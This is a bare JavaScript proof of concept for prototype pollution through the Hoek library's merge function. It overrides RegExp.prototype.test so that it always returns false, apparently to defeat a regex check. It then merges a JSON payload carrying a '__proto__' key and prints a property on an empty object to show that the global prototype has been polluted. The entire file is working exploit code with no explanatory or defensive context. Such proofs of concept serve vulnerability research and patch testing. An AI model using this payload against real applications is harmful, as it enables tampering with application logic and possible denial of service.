RegExp.prototype.test = () => false;
const Hoek = require('hoek');
obj = {};
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
Hoek.merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);